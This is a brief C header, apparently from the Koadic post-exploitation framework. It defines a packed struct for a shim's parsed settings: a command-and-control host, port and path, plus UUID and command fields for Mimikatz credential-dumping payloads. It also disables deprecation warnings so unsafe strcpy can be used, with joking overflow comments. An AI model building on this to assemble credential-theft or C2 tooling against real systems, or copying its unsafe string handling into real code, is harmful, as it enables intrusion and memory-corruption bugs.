#pragma once

#include <Windows.h>

// strcpy 4 life-- it was a buffalo overflow, in the heart of the shellcode
#if (_MSC_VER >= 1400)         // Check MSC version
#pragma warning(disable: 4996) // Disable deprecation
#endif

#pragma pack(push, 1)

typedef struct _koadic_shim_parsed {
	CHAR host[512];
	CHAR path[512];
	WORD port;
	BOOL secure;
	CHAR uuidHeader[100];
	CHAR uuidMimix86[40];
	CHAR uuidMimix64[40];
	CHAR uuidShimx64[40];
	CHAR mimicmd[100]; // 'twas a buffalo overflow
} koadic_shim_parsed;

#pragma pack(pop)